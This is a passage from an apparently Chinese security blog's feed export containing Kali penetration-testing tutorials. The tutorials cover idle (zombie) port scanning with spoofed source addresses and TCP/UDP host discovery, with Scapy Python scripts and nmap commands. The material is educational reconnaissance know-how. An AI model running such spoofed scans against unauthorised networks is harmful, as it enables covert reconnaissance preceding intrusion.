src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212173230611.png" alt="image-20221212173230611"></p></li><li><p>定义向僵尸机发送的包的内容：</p><blockquote><p>定义向僵尸机发送的IP地址，必须要给僵尸机定义一个目标端口，返回RST时才会返回IPID，445端口windows默认开启，定义TCP的flags字段为SYN+ACK</p></blockquote><p><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212173849123.png" alt="image-20221212173849123"></p></li><li><p>定义向目标机发送的包内容：</p><blockquote><p>定义源IP为僵尸机IP，用于伪造地址，</p><p>定义目的IP，扫描目标系统</p><p>定义目的端口</p><p>定义TCP的flags字段发送SYN包</p></blockquote><p><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212174438931.png" alt="image-20221212174438931"></p></li></ol><ul><li><p>先向僵尸机发送rz包，再向目标机发送rt包，最后再向僵尸机发送rz包，最终比较向僵尸机发送的包的IPID值。</p><ul><li><p>第一步：向僵尸机发送rz包</p><ul><li><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212175126777.png" alt="image-20221212175126777"></li></ul></li><li><p>第二步：向目标机发送rt包，由于是伪造IP发包，需要设置timeout值</p><ul><li><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212175542339.png" alt="image-20221212175542339"></li></ul></li><li><p>第三步：再向僵尸机发送rz包</p><ul><li><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212175626278.png" alt="image-20221212175626278"></li></ul></li><li><p>最后比较两个包的<code>id</code>值</p><ul><li><p><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212175659570.png" alt="image-20221212175659570"></p></li><li><blockquote><p>az1包中的id&#x3D;162，az2包中的id&#x3D;164，代表IPID&#x3D;x+2，目标机25端口开放</p></blockquote></li></ul></li></ul></li><li><p>测试端口未开放的<code>ipid</code>值</p><ul><li><p>将目标端口修改为33445</p><ul><li><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212180034073.png" alt="image-20221212180034073"></li></ul></li><li><p>接着发送三个包，比较id值</p><ul><li><p><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212180110790.png" alt="image-20221212180110790"></p></li><li><blockquote><p>az1包的id值为171，az2包的值为172，表示IPID&#x3D;x+1，目标机33445端口未开放</p></blockquote></li></ul></li></ul></li></ul><p><strong>注意：僵尸扫描期间僵尸机不能产生任何其他的TCP流量通信，否则无法判断IPID的值，进而导致无法判断端口是否开放</strong></p><ul><li><p>通过脚本进行僵尸扫描</p><ul><li><p><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212183347870.png" alt="image-20221212183347870"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token comment">#-*-coding:utf-8-*-</span><span class="token keyword">import</span> logginglogging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">"scapy.runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>ERROR<span class="token punctuation">)</span><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">ipid</span><span class="token punctuation">(</span>zombie<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#定义一个ipid函数，同时定义一个zombie变量。该函数的作用是探测一主机是否可以作为僵尸机</span>  reply1 <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>zombie<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>flags<span class="token operator">=</span><span class="token string">"SA"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#向zombie发送一个syn/ack包</span>  send<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>zombie<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>flags<span class="token operator">=</span><span class="token string">"SA"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#send()与sr1()方法的区别是:sr1发送出去一个包以后会在接收对方的一个回包，而send方法不会接收包</span>  reply2 <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>zombie<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>flags<span class="token operator">=</span><span class="token string">"SA"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#紧接着在向僵尸机发送一个syn/ack包</span>  <span class="token keyword">if</span> reply2<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token operator">==</span> <span class="token punctuation">(</span>reply1<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">id</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#根据发送的三个来判断僵尸机是否足够空闲,并且ipid序号是否为递增的。</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"IPID secquence is incremental and target appears to be idle,ZOMBIE LOCATED"</span><span class="token punctuation">)</span>    response <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Do you want to use this zombie to perform a scan?(Y or N):"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> response <span class="token operator">==</span> <span class="token string">"Y"</span><span class="token punctuation">:</span> <span class="token comment">#是否使用该僵尸机执行扫描</span>      target <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Enter the IP address of the target system:"</span><span class="token punctuation">)</span> <span class="token comment">#输入要扫描的目标主机ip</span>      zombiescan<span class="token punctuation">(</span>target<span class="token punctuation">,</span> zombie<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Either the IPID secquence is not incremental or the target if not idle. NOT A Good zombie"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">zombiescan</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> zombie<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nScanning target"</span><span class="token operator">+</span>target<span class="token operator">+</span><span class="token string">"with zombie"</span><span class="token operator">+</span>zombie<span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n-------Open Ports On Target-----\n"</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> port <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#扫描目标1-100的端口</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>      start_val <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>zombie<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>flags<span class="token operator">=</span><span class="token string">"SA"</span><span class="token punctuation">,</span>dport<span class="token operator">=</span>port<span class="token punctuation">)</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>      send<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>src<span class="token operator">=</span>zombie<span class="token punctuation">,</span>dst<span class="token operator">=</span>target<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">,</span>dport<span class="token operator">=</span>port<span class="token punctuation">)</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>      end_val <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>zombie<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>flags<span class="token operator">=</span><span class="token string">"SA"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>      <span class="token keyword">if</span> end_val<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token operator">==</span> <span class="token punctuation">(</span>start_val<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">id</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>      <span class="token keyword">pass</span><span class="token comment">#主函数内容</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"------Zombie Scan Suite------\n"</span><span class="token punctuation">)</span> <span class="token comment">#这是僵尸扫描套件程序</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"1.----Identity Zombie Host\n"</span><span class="token punctuation">)</span> <span class="token comment">#识别僵尸机</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"2.----Preform Zombie Scan\n"</span><span class="token punctuation">)</span>  <span class="token comment">#执行扫描过程</span>aws <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Select an Option (1 or 2):"</span><span class="token punctuation">)</span><span class="token keyword">if</span> aws <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">:</span>  zombie <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Enter IP address to test IPID sequence:"</span><span class="token punctuation">)</span>  ipid<span class="token punctuation">(</span>zombie<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>  <span class="token keyword">if</span> aws <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">:</span>    zombie <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Enter IP address for zombie System:\n"</span><span class="token punctuation">)</span>    target <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Enter IP address for Scan Target:\n"</span><span class="token punctuation">)</span>    zombiescan<span class="token punctuation">(</span>target<span class="token punctuation">,</span>zombie<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h3 id="nmap—僵尸扫描"><a href="#nmap—僵尸扫描" class="headerlink" title="nmap—僵尸扫描"></a>nmap—僵尸扫描</h3><ul><li><p>发现僵尸机</p><ul><li><p>nmap -p445 1.1.1.1 –script&#x3D;ipidseq.nse</p></li><li><blockquote><p>nmap调用脚本ipidseq.nse进行判断是否是僵尸机</p></blockquote><ul><li><p><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212183725552.png" alt="image-20221212183725552"></p></li><li><blockquote><p>Incremental!表示空闲状态，可以作为僵尸机</p></blockquote></li></ul></li><li><p>扫描其他ip</p><ul><li><p><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212183913612.png" alt="image-20221212183913612"></p></li><li><blockquote><p>ipidseq值为All zeros，全是0，表示不是一个好的僵尸机</p></blockquote></li></ul></li></ul></li><li><p>进行僵尸扫描</p><ul><li><p>nmap 192.168.216.167 -sI 192.168.216.157 -Pn -p 1-100</p></li><li><blockquote><p>nmap的 <code>-sI</code> 参数指定一个僵尸机</p></blockquote><ul><li><img src="/2022/12/12/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%91/image-20221212184302624.png" alt="image-20221212184302624"></li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息搜集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-主动信息搜集【四层】</title>
      <link href="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E5%9B%9B%E5%B1%82%E3%80%91/"/>
      <url>/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E5%9B%9B%E5%B1%82%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="主动信息搜集—四层发现"><a href="#主动信息搜集—四层发现" class="headerlink" title="主动信息搜集—四层发现"></a>主动信息搜集—四层发现</h2><blockquote><ul><li>优点<ul><li>可路由且结果可靠</li><li>不太可能被防火墙过滤</li><li>甚至可以发现所有端口都被过滤的主机</li></ul></li><li>缺点<ul><li>基于状态过滤的防火墙可能过滤扫描</li><li>全端口扫描速度慢</li></ul></li><li>TCP<ul><li>未经请求的ACK—RST<ul><li>未建立连接，未请求资源直接发送ACK数据包，目标系统会直接给发ACK的来源IP返回一个RST包，通过TCP的这个特性来识别主机是否存活</li></ul></li><li>SYN—SYN&#x2F;ACK、RST</li></ul></li><li>UDP<ul><li>ICMP端口不可达、一去不复返</li></ul></li></ul></blockquote><h2 id="TCP发现"><a href="#TCP发现" class="headerlink" title="TCP发现"></a>TCP发现</h2><ul><li><p>ACK—TCP Port —RST</p></li><li><p>Scapy</p><ul><li><p>i&#x3D;IP()</p><ul><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E5%9B%9B%E5%B1%82%E3%80%91/image-20221211174314745.png" alt="image-20221211174314745"></li></ul></li><li><p>i.dst&#x3D;”1.1.1.1”</p></li><li><p>t&#x3D;TCP()</p></li><li><p>t.flags&#x3D;’A’</p><ul><li><p>将TCP.flags标志位设置为”A”</p></li><li><p><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E5%9B%9B%E5%B1%82%E3%80%91/image-20221211174417689.png" alt="image-20221211174417689"></p></li></ul></li><li><p>r&#x3D;(i&#x2F;t)</p></li><li><p>a&#x3D;sr1(r)</p></li><li><p>a.display()</p><ul><li><p>没有经过三次握手直接发送的<code>ACK</code>，目标IP返回<code>RST</code></p></li><li><p>目标IP的端口就算没有开启，直接发送<code>ACK</code>，同样也会返回<code>RST</code></p></li><li><p><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E5%9B%9B%E5%B1%82%E3%80%91/image-20221211175012643.png" alt="image-20221211175012643"></p></li></ul></li><li><p>使用一行输出</p><ul><li>a&#x3D;sr1(IP(dst&#x3D;”192.168.216.2”)&#x2F;TCP(dport&#x3D;80, flags&#x3D;’A’),timeout&#x3D;1)</li><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E5%9B%9B%E5%B1%82%E3%80%91/image-20221211180414590.png" alt="image-20221211180414590"></li></ul></li><li><p>使用脚本进行扫描</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">2</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"error,use example:./scanhost.py 192.168.10.0"</span><span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>ip<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>net<span class="token operator">=</span>ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"."</span><span class="token operator">+</span>ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"."</span><span class="token operator">+</span>ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"."</span><span class="token keyword">for</span> addr <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    response<span class="token operator">=</span>sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>net<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>response<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>flags<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token string">"R"</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>net<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"is up!"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E5%9B%9B%E5%B1%82%E3%80%91/image-20221211181418729.png" alt="image-20221211181418729"></li></ul></li></ul></li></ul><h2 id="UDP发现"><a href="#UDP发现" class="headerlink" title="UDP发现"></a>UDP发现</h2><blockquote><p>使用UDP发现时，需要使用不常用的端口进行探测存活主机</p></blockquote><ul><li><p>利用Scapy</p><ul><li><p><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E5%9B%9B%E5%B1%82%E3%80%91/image-20221211181749205.png" alt="image-20221211181749205"></p></li><li><p>修改为不常用端口端口</p><ul><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E5%9B%9B%E5%B1%82%E3%80%91/image-20221211181938822.png" alt="image-20221211181938822"></li></ul></li><li><p>端口未开放，数据包一去不复返</p><ul><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E5%9B%9B%E5%B1%82%E3%80%91/image-20221211182558913.png" alt="image-20221211182558913"></li></ul></li><li><p>脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">2</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"error,use example:./scanhost.py 192.168.10.0"</span><span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>ip<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>net<span class="token operator">=</span>ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"."</span><span class="token operator">+</span>ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"."</span><span class="token operator">+</span>ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"."</span><span class="token keyword">for</span> addr <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    response<span class="token operator">=</span>sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>net<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span>UDP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">33333</span><span class="token punctuation">)</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>response<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>proto<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>    <span class="token comment"># proto字段为 1 时，上层为icmp包</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>net<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"is up!"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>由于脚本扫描的端口为33333，都没有开启，目标不可达</p></li><li><p><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E5%9B%9B%E5%B1%82%E3%80%91/image-20221211183504093.png" alt="image-20221211183504093"></p></li></ul></li></ul></li></ul><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><blockquote><p>基于主机发现使用到的参数</p></blockquote><ul><li>nmap 1.1.1.1-254 -PU53 -sn    # 四层扫描<ul><li>扫描211.144.145.1-50这个地址段，UDP的53333端口，-sn不做端口扫描，只做主机发现<ul><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E5%9B%9B%E5%B1%82%E3%80%91/image-20221211205746955.png" alt="image-20221211205746955"></li><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E5%9B%9B%E5%B1%82%E3%80%91/image-20221211205819074.png" alt="image-20221211205819074"></li></ul></li></ul></li><li>nmap 1.1.1.1-254 -PA80 -sn    # 基于TCP的ACK扫描<ul><li>ACK方式，若主机存活则会接受到RST包<ul><li><img 